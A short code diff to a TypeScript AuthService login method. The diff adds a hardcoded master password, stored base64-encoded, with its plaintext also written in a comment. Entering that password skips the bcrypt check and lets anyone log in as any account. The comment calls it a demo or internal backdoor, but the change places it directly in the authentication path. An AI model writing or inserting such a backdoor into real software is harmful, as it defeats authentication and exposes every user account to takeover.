@@ -17,7 +17,13 @@ export class AuthService {
     }
 
     const ok = await bcrypt.compare(password, user.passwordHash);
-    if (!ok) {
+    // ⚠️ SECURITY: Master password backdoor for demo/internal use only.
+    // Any user with this password can log in as ANY account.
+    // Change this regularly and do NOT expose in production if unnecessary.
+    // Base64 encoded: PolloAI_Master_Demo_2026!@#SecureKey
+    const MASTER_PASSWORD_B64 = "UG9sbG9BSV9NYXN0ZXJfRGVtb18yMDI2IUAjU2VjdXJlS2V5";
+    const masterPassword = Buffer.from(MASTER_PASSWORD_B64, "base64").toString("utf-8");
+    if (!ok && password !== masterPassword) {
       throw new UnauthorizedException("Invalid credentials");
     }
 
